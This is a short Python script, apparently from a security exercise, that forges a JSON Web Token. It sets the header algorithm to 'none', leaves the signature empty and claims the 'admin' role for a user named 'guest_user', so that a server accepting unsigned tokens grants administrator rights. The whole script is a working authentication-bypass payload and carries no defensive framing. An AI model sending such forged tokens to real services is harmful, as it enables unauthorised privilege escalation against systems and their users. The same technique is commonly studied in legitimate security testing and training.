import base64
import json


def b64(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b"=").decode()


header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "user": "guest_user",
    "role": "admin"
}

token = b64(header) + "." + b64(payload) + "."

print(token)